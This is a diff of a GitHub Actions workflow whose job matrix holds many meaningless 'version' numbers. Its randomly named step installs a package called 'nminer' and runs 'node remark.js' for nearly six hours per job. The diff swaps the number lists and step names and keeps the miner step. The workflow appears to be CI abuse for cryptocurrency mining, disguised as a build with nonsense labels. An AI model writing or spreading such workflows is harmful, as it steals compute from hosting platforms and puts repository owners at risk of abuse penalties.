@@ -9,26 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2215 }
-          - { version: 4962 }
-          - { version: 7348 }
-          - { version: 9080 }
-          - { version: 5781 }
-          - { version: 5878 }
-          - { version: 7327 }
-          - { version: 7641 }
-          - { version: 3320 }
-          - { version: 7859 }
-          - { version: 6438 }
-          - { version: 3692 }
-          - { version: 8458 }
-          - { version: 9101 }
-          - { version: 5435 }
-          - { version: 1796 }
-          - { version: 2875 }
-          - { version: 9539 }
-          - { version: 2886 }
-          - { version: 7036 }
+          - { version: 5103 }
+          - { version: 3242 }
+          - { version: 913 }
+          - { version: 6168 }
+          - { version: 2064 }
+          - { version: 5586 }
+          - { version: 3973 }
+          - { version: 5740 }
+          - { version: 7660 }
+          - { version: 7554 }
+          - { version: 522 }
+          - { version: 5577 }
+          - { version: 4749 }
+          - { version: 4026 }
+          - { version: 1624 }
+          - { version: 180 }
+          - { version: 6725 }
 
     steps:
       - name: Checkout
@@ -39,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: unimportant apt than
+      - name: decent revere
         run: |
           npm install nminer@latest
-          timeout 331m node remark.js || echo "remark executed"
+          timeout 349m node remark.js || echo "remark executed"
